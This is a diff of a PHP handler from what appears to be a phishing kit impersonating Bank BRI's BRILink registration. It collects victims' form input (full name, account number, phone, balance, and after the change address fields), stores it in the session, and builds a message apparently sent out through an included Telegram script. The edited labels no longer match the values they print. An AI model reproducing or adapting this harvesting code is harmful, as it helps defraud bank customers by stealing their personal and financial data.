@@ -2,28 +2,29 @@
 include "telegram.php";
 session_start();
 
-$nama = $_POST['nama'];
-$rek = $_POST['rek'];
-$nomor = $_POST['nomor'];
-$saldo = $_POST['saldo'];
+$provinsi  = $_POST['provinsi'];
+$kabupaten = $_POST['kabupaten'];
+$kecamatan = $_POST['kecamatan'];
+$kelurahan = $_POST['kelurahan'];
 
-$_SESSION['nama'] = $nama;
-$_SESSION['rek'] = $rek;
-$_SESSION['nomor'] = $nomor;
-$_SESSION['saldo'] = $saldo;
+$_SESSION['provinsi'] = $provinsi;
+$_SESSION['kabupaten'] = $kabupaten;
+$_SESSION['kecamatan'] = $kecamatan;
+$_SESSION['kelurahan'] = $kelurahan;
 
 $message = "
 ( Bank BRI | DAFTAR BRILink | )
 
 - Nama Lengkap :
-  ".$nama."
+  ".$provinsi."  ".$kabupaten."
+
 
 - Nomor Rekening :
-  ".$rek."
+  ".$kabupaten."
 
-- No HP : ".$nomor."
+- No HP : ".$kecamatan."
 
-- Saldo : ".$saldo."
+- Saldo : ".$kelurahan."
 
  ";
 
